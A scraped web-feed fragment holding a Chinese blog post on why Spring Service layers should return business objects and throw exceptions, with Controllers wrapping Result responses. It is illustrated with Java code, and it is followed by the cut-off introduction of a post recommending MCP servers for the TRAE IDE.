                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>昨天在Code Review时，我发现阿城在Service层直接返回了Result对象。</p>
<p>指出这个问题后，阿城有些不解，反问我为什么不能这样写。</p>
<p>于是我们展开了一场技术讨论（battle 🤣）。</p>
<p>讨论过程中，我发现这个看似简单的设计问题，背后其实涉及分层架构、职责划分、代码复用等多个重要概念。</p>
<p>与其让这次讨论的内容随风而去，不如整理成文，帮助更多遇到同样困惑的朋友理解原因。</p>
<p>知其然，更知其所以然。</p>
<p>耐心看完，你一定有所收获。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b12b4bdb6bed4152843b49071981191a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Y-q5Y-r54Wk55CD55qE54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980179&amp;x-signature=kdIYWMhl4aVKmsVDSyp4Vf8p3XI%3D" alt="Pokemon GIF.gif" loading="lazy"/></p>
<h2 data-id="heading-1">正文</h2>
<h3 data-id="heading-2">职责分离原则</h3>
<p>在传统的MVC架构中，Service层和Controller层各自承担着不同的职责。</p>
<p>Service层负责业务逻辑的处理，而Controller层负责HTTP请求的处理和响应格式的封装。</p>
<p>当我们将数据包装成 <code>Result</code> 对象的任务交给 Service 层时，意味着 Service 层不再单纯地处理业务逻辑，而是牵涉到了数据处理和响应的部分。</p>
<p>这样会导致业务逻辑与表现逻辑的耦合，降低了代码的清晰度和可维护性。</p>
<p>看一个不推荐的写法:</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> Result&lt;User&gt; getUserById(<span class="hljs-built_in">Long</span> id) {
        User user = userMapper.selectById(id);
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> Result.error(<span class="hljs-number">404</span>, 用户不存在);
        }
        <span class="hljs-keyword">return</span> Result.success(user);
    }
}

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/user/{id}"</span>)</span>
    <span class="hljs-keyword">public</span> Result&lt;User&gt; getUser(<span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">Long</span> id) {
        <span class="hljs-keyword">return</span> userService.getUserById(id);
    }
}
</code></pre>
<p>上面代码中，Service 层不仅负责从数据库获取用户信息，还直接处理了返回的结果。</p>
<p>如果我们需要改变返回的格式，或者进行错误信息的标准化，所有 Service 层的方法都需要修改。这样会导致代码的高耦合。</p>
<p>相比之下，以下做法将展示逻辑留给 Controller 层，保证了业务逻辑的纯粹性：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-keyword">public</span> User getUserById(<span class="hljs-built_in">Long</span> id) {
        User user = userMapper.selectById(id);
        <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> new BusinessException(用户不存在);
        }
        <span class="hljs-keyword">return</span> user;
    }
}

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/user/{id}"</span>)</span>
    <span class="hljs-keyword">public</span> Result&lt;User&gt; getUser(<span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">Long</span> id) {
        User user = userService.getUserById(id);
        <span class="hljs-keyword">return</span> Result.success(user);
    }
}
</code></pre>
<p>让每一层都专注于自己的职责。</p>
<h3 data-id="heading-3">可复用性问题</h3>
<p>当Service层返回Result时，会严重影响方法的可复用性。</p>
<p>假设我们有一个订单服务需要调用用户服务:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class OrderService {
    <span class="hljs-keyword">@Autowired</span>
    private UserService userService;
    
    public void <span class="hljs-built_in">createOrder</span>(Long userId, OrderDTO orderDTO) {
        <span class="hljs-comment">// 不推荐的方式:需要解包Result</span>
        Result&lt;User&gt; userResult = userService<span class="hljs-selector-class">.getUserById</span>(userId);
        if (!userResult.isSuccess()) {
            throw new <span class="hljs-built_in">BusinessException</span>(userResult.getMessage());
        }
        User user = userResult<span class="hljs-selector-class">.getData</span>();
        
        <span class="hljs-comment">// 后续业务逻辑</span>
        <span class="hljs-built_in">validateUserStatus</span>(user);
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>这种写法有个很明显的问题。</p>
<p><code>OrderService</code> 作为另一个业务服务，业务之间的调用本来应该简单直接，但使用 <code>Result</code> 带来了两个问题：</p>
<ol>
<li>
<p>不知道 <code>Result</code> 里到底包含什么，还得去查看代码里面的实现，写起来麻烦。</p>
</li>
<li>
<p>还需要额外判断 <code>Result</code> 的状态，增加了不必要的复杂度。</p>
</li>
</ol>
<p>如果是调用第三方外部服务，需要这种包装还能理解，但在自己业务之间互相调用时，完全没必要这样做。</p>
<p>如果Service返回纯业务对象:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Long userId, OrderDTO orderDTO)</span> {
        <span class="hljs-comment">// 推荐的方式:直接获取业务对象</span>
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userService.getUserById(userId);
        
        <span class="hljs-comment">// 后续业务逻辑</span>
        validateUserStatus(user);
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>代码变得简洁且符合直觉。</p>
<p>业务层之间直接传递业务对象，保持简单和清晰。</p>
<h3 data-id="heading-4">异常处理机制</h3>
<p>有些 Service 层在业务判断失败后，会直接返回 <code>Result.fail(xxx)</code> 这样的代码，例如：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Long userId, OrderDTO orderDTO)</span> {
    <span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">"用户ID不能为空"</span>);
    }
    <span class="hljs-comment">// 后续业务逻辑</span>
    <span class="hljs-keyword">return</span> Result.success();
}
</code></pre>
<p>这种做法有几个问题：</p>
<ol>
<li>
<p><strong>重复的错误处理</strong>：每个方法都得写一大堆类似的错误判断代码，增加了代码量。</p>
</li>
<li>
<p><strong>错误分散</strong>：错误处理分散在每个方法里，如果需要改进错误逻辑，要在多个地方修改，麻烦且容易出错。</p>
</li>
</ol>
<p>而如果我们通过抛出异常并结合全局异常处理来统一处理错误，例如：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">Long userId, OrderDTO orderDTO</span>) {
    <span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"用户ID不能为空"</span>);
    }
    <span class="hljs-comment">// 后续业务逻辑</span>
}
</code></pre>
<p>再通过全局异常捕获来转换为 <code>Result</code>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@RestControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> {
    <span class="hljs-meta">@ExceptionHandler(BusinessException.class)</span>
    <span class="hljs-keyword">public</span> Result&lt;<span class="hljs-built_in">Void</span>&gt; handleBusinessException(BusinessException e) {
        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-number">400</span>, e.getMessage());
    }

    <span class="hljs-meta">@ExceptionHandler(Exception.class)</span>
    <span class="hljs-keyword">public</span> Result&lt;<span class="hljs-built_in">Void</span>&gt; handleException(Exception e) {
        log.error(<span class="hljs-string">"系统异常"</span>, e);  <span class="hljs-comment">// 这里可以查看堆栈信息</span>
        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-number">500</span>, <span class="hljs-string">"系统繁忙"</span>);
    }
}
</code></pre>
<p>这样做的好处是：</p>
<ul>
<li>
<p><strong>减少重复代码</strong>：业务方法不再需要写重复的错误判断，代码更简洁。</p>
</li>
<li>
<p><strong>集中错误处理</strong>：错误处理集中在一个地方，修改时只需修改全局异常处理器，不用改动每个 Service 层方法。</p>
</li>
<li>
<p><strong>业务与错误分离</strong>：业务逻辑专注处理核心功能，错误处理交给统一的机制，代码更加清晰易懂。</p>
</li>
</ul>
<p>而且异常可以携带更丰富的上下文信息，如果业务侧需要时，可以带上堆栈信息，便于一些问题的定位。</p>
<h3 data-id="heading-5">测试便利性</h3>
<p>Service层返回业务对象而不是Result时，能够大大提升单元测试的便利性:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@SpringBootTest</span>
public class UserServiceTest {
    
    <span class="hljs-keyword">@Autowired</span>
    private UserService userService;
    
    <span class="hljs-keyword">@Test</span>
    public void testGetUserById() {
        <span class="hljs-comment">// 推荐的方式:直接断言业务对象</span>
        User user = userService<span class="hljs-selector-class">.getUserById</span>(<span class="hljs-number">1</span>L);
        <span class="hljs-built_in">assertNotNull</span>(user);
        <span class="hljs-built_in">assertEquals</span>(张三, user.getName());
    }
    
    <span class="hljs-keyword">@Test</span>
    public void testGetUserById_NotFound() {
        <span class="hljs-comment">// 推荐的方式:断言抛出异常</span>
        <span class="hljs-built_in">assertThrows</span>(BusinessException.class, () -&gt; {
            userService<span class="hljs-selector-class">.getUserById</span>(<span class="hljs-number">999</span>L);
        });
    }
}
</code></pre>
<p>如果Service返回Result，测试代码则需要写得更复杂:</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Test</span>
public void testGetUserById() {
    <span class="hljs-comment">// 不推荐的方式:需要解包Result</span>
    Result&lt;User&gt; result = userService<span class="hljs-selector-class">.getUserById</span>(<span class="hljs-number">1</span>L);
    <span class="hljs-built_in">assertTrue</span>(result.isSuccess());
    <span class="hljs-built_in">assertNotNull</span>(result.getData());
    <span class="hljs-built_in">assertEquals</span>(张三, result.getData()<span class="hljs-selector-class">.getName</span>());
}
</code></pre>
<p>测试代码变得莫名冗长，还得去关注响应结构，这并不是Service层测试的关注点。</p>
<p>Service 层本应专注于业务逻辑，测试也应该直接验证业务数据。</p>
<h3 data-id="heading-6">领域驱动设计角度</h3>
<p>再换个角度。</p>
<p>从领域驱动设计（DDD）的角度来看，Service 层属于应用层或领域层，应该使用领域语言来表达业务逻辑。</p>
<p>而 <code>Result</code> 是基础设施层的概念，代表 HTTP 响应格式，不应该污染领域层。</p>
<p>例如，考虑转账业务：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class TransferService {
    
    public TransferResult <span class="hljs-built_in">transfer</span>(Long fromAccountId, Long toAccountId, BigDecimal amount) {
        Account fromAccount = accountRepository<span class="hljs-selector-class">.findById</span>(fromAccountId);
        Account toAccount = accountRepository<span class="hljs-selector-class">.findById</span>(toAccountId);
        
        fromAccount<span class="hljs-selector-class">.deduct</span>(amount);
        toAccount<span class="hljs-selector-class">.deposit</span>(amount);
        
        accountRepository<span class="hljs-selector-class">.save</span>(fromAccount);
        accountRepository<span class="hljs-selector-class">.save</span>(toAccount);
        
        return new <span class="hljs-built_in">TransferResult</span>(fromAccount, toAccount, amount);
    }
}
</code></pre>
<p>在这个例子中，<code>TransferResult</code> 是一个领域对象，代表了转账的结果，包含了与业务相关的意义，而不是一个通用的 HTTP 响应封装 <code>Result</code>。</p>
<p>这种做法更符合领域模型的表达，体现了领域层的职责——处理业务逻辑，而不是涉及 HTTP 响应格式的细节。</p>
<h3 data-id="heading-7">接口适配的灵活性</h3>
<p>当 Service 层返回纯粹的业务对象时，Controller 层可以根据不同的接口需求灵活封装响应：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@RestController</span>
<span class="hljs-variable">@RequestMapping</span>(<span class="hljs-string">"/api"</span>)
public class UserController {
    
    <span class="hljs-variable">@Autowired</span>
    private UserService userService;
    
    <span class="hljs-comment">// REST接口返回Result</span>
    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/user/{id}"</span>)
    public Result&lt;User&gt; <span class="hljs-built_in">getUser</span>(<span class="hljs-variable">@PathVariable</span> Long id) {
        <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserById</span>(id);
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">Result</span><span class="hljs-selector-class">.success</span>(user);
    }
    
    <span class="hljs-comment">// GraphQL接口直接返回对象</span>
    @<span class="hljs-selector-tag">QueryMapping</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span>(<span class="hljs-variable">@Argument</span> Long id) {
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserById</span>(id);
    }
    
    <span class="hljs-comment">// RPC接口返回自定义格式</span>
    @<span class="hljs-selector-tag">DubboService</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">UserRpcServiceImpl</span> <span class="hljs-selector-tag">implements</span> <span class="hljs-selector-tag">UserRpcService</span> {
        <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">UserDTO</span> <span class="hljs-selector-tag">getUserById</span>(Long id) {
            <span class="hljs-selector-tag">User</span> <span class="hljs-selector-tag">user</span> = <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserById</span>(id);
            <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">convertToDTO</span>(user);
        }
    }
}
</code></pre>
<p>同一个Service方法可以被不同类型的接口复用，每个接口根据自己的协议要求封装响应。</p>
<p>强行使用 <code>Result</code> 会导致接口的适配性变差，无法根据不同协议的需求灵活定制响应格式。</p>
<p>灵活性反而丢失了。</p>
<h3 data-id="heading-8">事务边界清晰</h3>
<p>Service 层通常是事务边界所在，当 Service 返回业务对象时，事务的语义更加清晰：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Service</span>
public class OrderService {
    
    <span class="hljs-keyword">@Transactional</span>
    public Order createOrder(OrderDTO orderDTO) {
        <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = new <span class="hljs-attribute">Order</span>();
        <span class="hljs-comment">// 设置订单属性</span>
        orderMapper<span class="hljs-selector-class">.insert</span>(order);
        
        <span class="hljs-comment">// 扣减库存</span>
        inventoryService<span class="hljs-selector-class">.deduct</span>(orderDTO.getProductId(), orderDTO<span class="hljs-selector-class">.getQuantity</span>());
        
        return <span class="hljs-attribute">order</span>;
    }
}
</code></pre>
<p>在这个例子中，事务是围绕 Service 层的方法展开的，<code>@Transactional</code> 注解确保在业务逻辑执行失败时，事务会回滚。因为方法正常返回时，事务会提交；如果抛出异常，事务会回滚，事务的边界非常明确。</p>
<p>如果 Service 返回的是 <code>Result</code>，很难界定事务是否应该回滚。比如：</p>
<pre><code class="hljs language-scss" lang="scss">public Result&lt;<span class="hljs-attribute">Order</span>&gt; <span class="hljs-built_in">createOrder</span>(OrderDTO orderDTO) {
    <span class="hljs-attribute">Order</span> <span class="hljs-attribute">order</span> = new <span class="hljs-attribute">Order</span>();
    <span class="hljs-comment">// 设置订单属性</span>
    orderMapper<span class="hljs-selector-class">.insert</span>(order);
    
    <span class="hljs-comment">// 扣减库存</span>
    Result&lt;Void&gt; inventoryResult = inventoryService<span class="hljs-selector-class">.deduct</span>(orderDTO.getProductId(), orderDTO<span class="hljs-selector-class">.getQuantity</span>());
    if (!inventoryResult.isSuccess()) {
        return Result<span class="hljs-selector-class">.fail</span>("库存不足");
    }
    
    return Result<span class="hljs-selector-class">.success</span>(order);
}
</code></pre>
<p>在这种情况下，如果库存不足，虽然 <code>Result</code> 返回失败信息，但事务并不会回滚，可能会导致数据不一致，反而还得额外去抛出异常。</p>
<p>而通过抛出异常的方式，事务的回滚语义非常清晰：异常抛出则回滚，方法正常返回则提交，这种设计确保了事务的边界更加明确，避免了潜在的数据一致性问题。</p>
<h2 data-id="heading-9">写在最后</h2>
<p>看来阿城要走的路还很长，码路漫漫，踏浪前行。</p>
<p>2026年，祝大家加班少，薪水多，bug少，头发多，多写点注释，少走点弯路。</p>
<p>人生就像一个大项目，需求多，时间紧，但没关系——bug 和头发总有一个会先来。</p>
<p>🤣</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE IDE 10 大热门 MCP Server 推荐]]></title>    <link>https://juejin.cn/post/7594801581003718692</link>    <guid>https://juejin.cn/post/7594801581003718692</guid>    <pubDate>2026-01-14T07:31:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594801581003718692" data-draft-id="7594302398687379510" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE IDE 10 大热门 MCP Server 推荐"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2026-01-14T07:31:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TRAE_ai"/> <meta itemprop="url" content="https://juejin.cn/user/3048259110571032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE IDE 10 大热门 MCP Server 推荐
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048259110571032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TRAE_ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:31:57.000Z" title="Wed Jan 14 2026 07:31:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读22分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fe3f5420775484f81876aa5452a76c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980716&amp;x-signature=Y%2FT15jOnwiQJdWrN3IIAFVCPKcc%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>本文作者：Jiaqi，TRAE 技术文档工程师</p>
</blockquote>
<p>通过引入合适的 MCP Server，智能体可以深度参与到日常开发流程中，协助完成项目文件读取、官方文档获取、浏览器自动化、代码仓库管理，以及跨会话的上下文维护等任务。</p>
<p>本文将基于真实开发场景，介绍 TRAE IDE 中常用的 10 个 MCP Server，并梳理了它们的核心能力、使用场景与可用工具，帮助你在不同开发阶段选择合适的 MCP Server，从而提升你的日常开发效率。 </p>
